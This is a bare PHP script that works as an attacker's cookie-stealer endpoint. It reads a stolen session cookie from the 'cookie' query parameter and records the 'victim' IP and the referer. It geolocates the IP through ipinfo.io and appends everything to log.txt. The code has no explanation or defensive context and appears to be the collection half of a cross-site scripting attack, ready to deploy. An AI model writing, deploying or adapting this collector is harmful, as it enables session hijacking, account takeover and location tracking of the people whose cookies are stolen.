<?php
function getClientIP() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? ($_SERVER['HTTP_CLIENT_IP'] ?? ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? ($_SERVER['REMOTE_HOST'] ?? 'IP Unknown')));
    return $ip;
}

function all() {
    $cookie = $_GET['cookie'] ?? 'Cookie Unknown'."\n";
    $ip = getClientIP();
    $VicIp = "user ip is >>> " . $ip . "\n";
    $ref = "user comes from >>> " . ($_SERVER['HTTP_REFERER'] ?? 'Referer Unknown') . "\n";
    $json = file_get_contents("https://ipinfo.io/$ip/geo");
    $data = json_decode($json, true);
    $country = "user country is >> " . $data['country'] . "\n";
    $region = "user region is >> " . $data['region'] . "\n";
    $city = "user city is >> " . $data['city'] . "\n";

    // Combine all the information into one string
    $info = $cookie . $VicIp . $ref . $country . $region . $city;

    return $info;
}

$info = all();
$file = fopen('log.txt', 'a');
fwrite($file, $info);
fclose($file);
?>
